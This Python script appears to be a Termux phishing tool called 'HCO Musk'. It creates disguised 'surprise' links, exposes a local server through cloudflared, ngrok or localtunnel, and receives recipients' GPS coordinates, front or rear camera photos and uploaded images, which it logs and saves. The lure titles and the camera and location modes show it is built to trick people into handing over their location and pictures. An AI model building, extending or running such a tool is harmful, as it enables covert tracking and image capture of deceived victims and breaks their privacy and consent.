
#!/usr/bin/env python3
# HCO Musk v1.2.0
# Copyright (c) 2026 HCO Team Azhar. All rights reserved.

import os
import sys
import json
import time
import re
import base64
import secrets
import shutil
import socket
import threading
import subprocess
import urllib.parse
import urllib.request

from pathlib import Path
from datetime import datetime
from http.server import ThreadingHTTPServer, SimpleHTTPRequestHandler
from functools import partial

GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
RED = "\033[91m"
MAGENTA = "\033[95m"
WHITE = "\033[97m"
BOLD = "\033[1m"
RESET = "\033[0m"

ROOT = Path(__file__).resolve().parent
WEB = ROOT / "web"
RESULTS = ROOT / "results"
CFG = ROOT / "config.json"

YT = "https://youtube.com/@hackers_colony_tech?si=6Uc1vADFNroqTvUP"

DEFAULT = {
    "youtube_url": YT,
    "photo_folder": str(Path.home() / "storage/dcim/HCO-Musk"),
    "port": 8765
}

try:
    CONFIG = {**DEFAULT, **json.loads(CFG.read_text(encoding="utf-8"))}
except Exception:
    CONFIG = DEFAULT.copy()

ACTIVE_TOKEN = None


def banner():
    os.system("clear")
    print(GREEN + BOLD + r"""
 _   _  ____ ___  __  __ _   _ ____  _  __
| | | |/ ___/ _ \|  \/  | | | / ___|| |/ /
| |_| | |  | | | | |\/| | | | \___ \| ' /
|  _  | |__| |_| | |  | | |_| |___) | . \
|_| |_|\____\___/|_|  |_|\___/|____/|_|\_\
""" + RESET)
    print(CYAN + BOLD + "              by HCO Team Azhar" + RESET)
    print(YELLOW + "       Camera • Location • Surprise Links" + RESET)


def pause():
    input(f"\n{CYAN}Press Enter to continue...{RESET}")


def support_page():
    os.system("clear")
    print(GREEN + BOLD + "          THIS IS A SUPPORT PAGE" + RESET)
    print("\nNow Termux will redirect to our YouTube channel.")
    print("Please like, subscribe and click on the bell 🔔")
    print("Then come back to Termux to run the tool.\n")

    for n in range(9, 0, -1):
        print(f"\r{CYAN}{BOLD}{n}...{RESET}", end="", flush=True)
        time.sleep(1)

    print(f"\r{GREEN}Opening YouTube...{RESET}")

    if shutil.which("termux-open-url"):
        try:
            subprocess.Popen(["termux-open-url", YT])
        except Exception:
            print(YT)
    else:
        print("Open:", YT)

    input(f"\n{YELLOW}Welcome back! Press Enter to run HCO Musk.{RESET}")


def copy_link(url):
    if shutil.which("termux-clipboard-set"):
        try:
            subprocess.run(
                ["termux-clipboard-set", url],
                capture_output=True,
                timeout=8,
                check=True
            )
            print(GREEN + "Link copied to clipboard!" + RESET)
        except Exception:
            print(YELLOW + "Copy link manually if needed." + RESET)


def open_link(url):
    if shutil.which("termux-open-url"):
        try:
            subprocess.Popen(["termux-open-url", url])
            return
        except Exception:
            pass
    print("Preview:", url)


class HCOHandler(SimpleHTTPRequestHandler):

    def log_message(self, fmt, *args):
        pass

    def send_json(self, status, data):
        raw = json.dumps(data).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(raw)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(raw)

    def do_POST(self):
        global ACTIVE_TOKEN

        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        token = params.get("token", [""])[0]

        if (
            not ACTIVE_TOKEN
            or not secrets.compare_digest(token, ACTIVE_TOKEN)
        ):
            self.send_error(403)
            return

        if parsed.path != "/api/result":
            self.send_error(404)
            return

        try:
            length = int(self.headers.get("Content-Length", 0))

            if length <= 0 or length > 12 * 1024 * 1024:
                self.send_error(413)
                return

            data = json.loads(self.rfile.read(length))
            kind = data.get("type", "")

            allowed = {
                "message_revealed",
                "location",
                "camera_photo",
                "photo_upload"
            }

            if kind not in allowed:
                self.send_error(400)
                return

            record = {
                "time": datetime.now().isoformat(),
                "type": kind,
                "mode": str(data.get("mode", ""))[:40]
            }

            if kind == "message_revealed":
                record["message"] = str(
                    data.get("message", "")
                )[:1000]

            elif kind == "location":
                lat = float(data["latitude"])
                lon = float(data["longitude"])
                accuracy = float(data.get("accuracy", 0))

                if not (-90 <= lat <= 90 and -180 <= lon <= 180):
                    raise ValueError("Invalid coordinates")

                record.update({
                    "latitude": lat,
                    "longitude": lon,
                    "accuracy": accuracy,
                    "maps": (
                        f"https://www.google.com/maps?q={lat},{lon}"
                    )
                })

            elif kind in ("camera_photo", "photo_upload"):
                image_data = data.get("image", "")

                if (
                    not isinstance(image_data, str)
                    or "," not in image_data
                ):
                    raise ValueError("Invalid image data")

                header, encoded = image_data.split(",", 1)

                if header not in (
                    "data:image/jpeg;base64",
                    "data:image/png;base64"
                ):
                    raise ValueError("Only JPEG and PNG are accepted")

                image_bytes = base64.b64decode(
                    encoded, validate=True
                )

                if not image_bytes or len(image_bytes) > 8 * 1024 * 1024:
                    raise ValueError("Image must be under 8 MB")

                media_dir = RESULTS / "received_media"
                media_dir.mkdir(parents=True, exist_ok=True)

                extension = ".jpg" if "jpeg" in header else ".png"

                filename = (
                    kind + "_"
                    + datetime.now().strftime("%Y%m%d_%H%M%S_%f")
                    + extension
                )

                target = media_dir / filename
                target.write_bytes(image_bytes)

                record["file"] = str(target)

            RESULTS.mkdir(parents=True, exist_ok=True)

            with (RESULTS / "events.jsonl").open(
                "a", encoding="utf-8"
            ) as f:
                f.write(json.dumps(record) + "\n")

            print("\n" + GREEN + BOLD)
            print("====== HCO MUSK RESULT RECEIVED ======")
            print(RESET)

            for key, value in record.items():
                print(f"{CYAN}{key}: {value}{RESET}")

            print(GREEN + "======================================" + RESET)

            self.send_json(200, {"success": True})

        except Exception as error:
            print(RED + "Result error: " + str(error) + RESET)
            self.send_json(400, {"success": False})


class LinkServer:

    def __init__(self, port):
        handler = partial(HCOHandler, directory=str(WEB))
        self.server = ThreadingHTTPServer(
            ("127.0.0.1", port),
            handler
        )
        self.thread = threading.Thread(
            target=self.server.serve_forever,
            daemon=True
        )

    def start(self):
        self.thread.start()

    def stop(self):
        self.server.shutdown()
        self.server.server_close()


def start_tunnel(provider, port):

    if provider == "cloudflare":
        if not shutil.which("cloudflared"):
            print(RED + "Install: pkg install cloudflared" + RESET)
            return None

        command = [
            "cloudflared", "tunnel",
            "--url", f"http://127.0.0.1:{port}",
            "--no-autoupdate"
        ]

    elif provider == "ngrok":
        if not shutil.which("ngrok"):
            print(RED + "Install and configure ngrok first." + RESET)
            return None

        command = ["ngrok", "http", str(port), "--log", "stdout"]

    elif provider == "localtunnel":
        if not shutil.which("lt"):
            print(RED + "Install with: npm install -g localtunnel" + RESET)
            return None

        command = ["lt", "--port", str(port)]

    else:
        return None

    print(YELLOW + f"Starting {provider}..." + RESET)

    try:
        proc = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
    except Exception as error:
        print(RED + str(error) + RESET)
        return None

    lines = []

    def reader():
        try:
            for line in proc.stdout:
                lines.append(line.rstrip())
                if len(lines) > 100:
                    del lines[:30]
        except Exception:
            pass

    threading.Thread(target=reader, daemon=True).start()

    deadline = time.time() + 40
    found = None

    while time.time() < deadline and proc.poll() is None:
        output = "\n".join(lines)

        if provider == "cloudflare":
            match = re.search(
                r"https://[a-zA-Z0-9-]+\.trycloudflare\.com",
                output
            )
            if match:
                found = match.group(0)

        elif provider == "localtunnel":
            match = re.search(
                r"https://[a-zA-Z0-9.-]+\.(?:loca\.lt|localtunnel\.me)",
                output
            )
            if match:
                found = match.group(0)

        elif provider == "ngrok":
            try:
                with urllib.request.urlopen(
                    "http://127.0.0.1:4040/api/tunnels",
                    timeout=1
                ) as response:
                    data = json.loads(response.read().decode())

                for tunnel in data.get("tunnels", []):
                    url = tunnel.get("public_url", "")
                    if url.startswith("https://"):
                        found = url
                        break
            except Exception:
                pass

        if found:
            return proc, found

        time.sleep(0.5)

    print(RED + "Could not detect public tunnel URL." + RESET)
    print("\n".join(lines[-10:]) or "No provider output.")

    try:
        proc.terminate()
    except Exception:
        pass

    return None


def choose_provider():
    print(f"\n{MAGENTA}{BOLD}LINK SERVER MANAGER{RESET}")
    print("1. Cloudflare Quick Tunnel")
    print("2. ngrok")
    print("3. LocalTunnel")
    print("4. Auto Select")
    print("0. Back")

    choice = input("Select: ").strip()

    return {
        "1": "cloudflare",
        "2": "ngrok",
        "3": "localtunnel",
        "4": "auto"
    }.get(choice)


def generate_link(mode):
    global ACTIVE_TOKEN

    if not (WEB / "index.html").exists():
        print(RED + "web/index.html is missing!" + RESET)
        return

    title = input(
        "Surprise title [Someone sent you a surprise!]: "
    ).strip() or "Someone sent you a surprise!"

    message = ""

    if mode == "custom":
        message = input("Your surprise message: ").strip()
        if not message:
            message = "🎉 Surprise! You found it!"

    try:
        port = int(CONFIG.get("port", 8765))
    except Exception:
        port = 8765

    server = None
    tunnel_proc = None

    try:
        server = LinkServer(port)
        server.start()
    except OSError as error:
        print(RED + f"Server error: {error}" + RESET)
        return

    token = secrets.token_urlsafe(24)
    ACTIVE_TOKEN = token

    print(GREEN + "Local HCO page started." + RESET)

    provider = choose_provider()

    if provider is None:
        ACTIVE_TOKEN = None
        server.stop()
        return

    providers = (
        ["cloudflare", "localtunnel", "ngrok"]
        if provider == "auto"
        else [provider]
    )

    public_url = None

    for item in providers:
        result = start_tunnel(item, port)
        if result:
            tunnel_proc, public_url = result
            break

    if not public_url:
        ACTIVE_TOKEN = None
        server.stop()
        print(YELLOW + "No tunnel is running. Try another provider." + RESET)
        return

    query = {
        "mode": mode,
        "title": title,
        "token": token
    }

    if message:
        query["message"] = message

    share_url = (
        public_url.rstrip("/")
        + "/?"
        + urllib.parse.urlencode(query)
    )

    print("\n" + GREEN + BOLD + "YOUR SURPRISE LINK IS READY!" + RESET)
    print(CYAN + share_url + RESET)

    print(YELLOW + "Share this link only with its intended recipient." + RESET)

    copy_link(share_url)

    print("\n1. Preview link")
    print("2. Keep server running")
    print("0. Stop server and return")

    action = input("Choose: ").strip()

    if action == "1":
        open_link(share_url)

    if action == "2":
        print(
            YELLOW
            + "Keep Termux open. Press Ctrl+C to stop."
            + RESET
        )

        try:
            while tunnel_proc.poll() is None:
                time.sleep(1)
        except KeyboardInterrupt:
            pass

    try:
        if tunnel_proc and tunnel_proc.poll() is None:
            tunnel_proc.terminate()
            tunnel_proc.wait(timeout=5)
    except Exception:
        try:
            tunnel_proc.kill()
        except Exception:
            pass

    ACTIVE_TOKEN = None
    server.stop()

    print(GREEN + "HCO Musk server stopped." + RESET)


def surprise_menu():
    while True:
        print(f"\n{MAGENTA}{BOLD}SURPRISE LINK GENERATOR{RESET}")
        print("1. Secret Message Surprise")
        print("2. Location Surprise")
        print("3. Camera Surprise")
        print("4. Photo Surprise")
        print("5. Custom Surprise")
        print("0. Back")

        c = input("HCO Musk > ").strip()

        modes = {
            "1": "custom",
            "2": "location",
            "3": "camera",
            "4": "photo",
            "5": "custom"
        }

        if c == "0":
            return

        if c in modes:
            generate_link(modes[c])
        else:
            print(RED + "Invalid option." + RESET)

        pause()


def camera_menu():
    while True:
        print(f"\n{MAGENTA}{BOLD}CAMERA TOOLS{RESET}")
        print("1. Front Camera Surprise")
        print("2. Rear Camera Surprise")
        print("3. Camera Preview Surprise")
        print("0. Back")

        c = input("HCO Musk > ").strip()

        if c == "0":
            return
        elif c == "1":
            generate_link("camera-front")
        elif c == "2":
            generate_link("camera-rear")
        elif c == "3":
            generate_link("camera")
        else:
            print(RED + "Invalid option." + RESET)

        pause()


def location_menu():
    while True:
        print(f"\n{MAGENTA}{BOLD}LOCATION TOOLS{RESET}")
        print("1. Location Sharing Surprise")
        print("2. Map Surprise")
        print("0. Back")

        c = input("HCO Musk > ").strip()

        if c == "0":
            return
        elif c == "1":
            generate_link("location")
        elif c == "2":
            generate_link("location-map")
        else:
            print(RED + "Invalid option." + RESET)

        pause()


def media_menu():
    while True:
        print(f"\n{MAGENTA}{BOLD}MEDIA TOOLS{RESET}")
        print("1. Photo Surprise Link")
        print("2. View Received Photos")
        print("0. Back")

        c = input("HCO Musk > ").strip()

        if c == "0":
            return

        elif c == "1":
            generate_link("photo")

        elif c == "2":
            folder = RESULTS / "received_media"
            folder.mkdir(parents=True, exist_ok=True)

            print("\nReceived media folder:")
            print(folder)

            for item in sorted(folder.iterdir()):
                print(item.name)

        else:
            print(RED + "Invalid option." + RESET)

        pause()


def show_results():
    log_file = RESULTS / "events.jsonl"

    if not log_file.exists():
        print(YELLOW + "No results received yet." + RESET)
        pause()
        return

    print(f"\n{MAGENTA}{BOLD}RECENT HCO MUSK RESULTS{RESET}")

    with log_file.open(encoding="utf-8") as f:
        lines = f.readlines()

    for line in lines[-15:]:
        try:
            record = json.loads(line)
            print("\n" + CYAN + record.get("time", "") + RESET)
            for key, value in record.items():
                if key != "time":
                    print(f"{WHITE}{key}: {value}{RESET}")
        except Exception:
            continue

    pause()


def system_check():
    print(f"\n{MAGENTA}{BOLD}SYSTEM CHECK{RESET}")

    for name in (
        "python",
        "cloudflared",
        "ngrok",
        "lt",
        "npm",
        "termux-open-url",
        "termux-clipboard-set"
    ):
        status = (
            GREEN + "AVAILABLE" + RESET
            if shutil.which(name)
            else YELLOW + "NOT INSTALLED" + RESET
        )
        print(f"{name:<22}{status}")

    print("\nResults folder:", RESULTS)
    pause()


def main():
    support_page()

    while True:
        banner()

        print(WHITE + BOLD + "\nMAIN MENU" + RESET)
        print("01. Surprise Link Generator")
        print("02. Camera Tools")
        print("03. Location Tools")
        print("04. Media Tools")
        print("05. Recent Results")
        print("06. System Check")
        print("07. About HCO Musk")
        print("00. Exit")

        c = input(
            f"\n{CYAN}{BOLD}HCO Musk @ Termux > {RESET}"
        ).strip().lower()

        if c in ("1", "01"):
            surprise_menu()
        elif c in ("2", "02"):
            camera_menu()
        elif c in ("3", "03"):
            location_menu()
        elif c in ("4", "04"):
            media_menu()
        elif c in ("5", "05"):
            show_results()
        elif c in ("6", "06"):
            system_check()
        elif c in ("7", "07"):
            print(GREEN + "HCO Musk v1.2.0" + RESET)
            print("Code by Azhar Team HCO")
            print(YT)
            pause()
        elif c in ("0", "00", "exit", "q"):
            print(GREEN + "Thanks for using HCO Musk!" + RESET)
            break
        else:
            print(RED + "Invalid option." + RESET)
            time.sleep(0.7)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        ACTIVE_TOKEN = None
        print("\nStopped by user.")
        sys.exit(0)
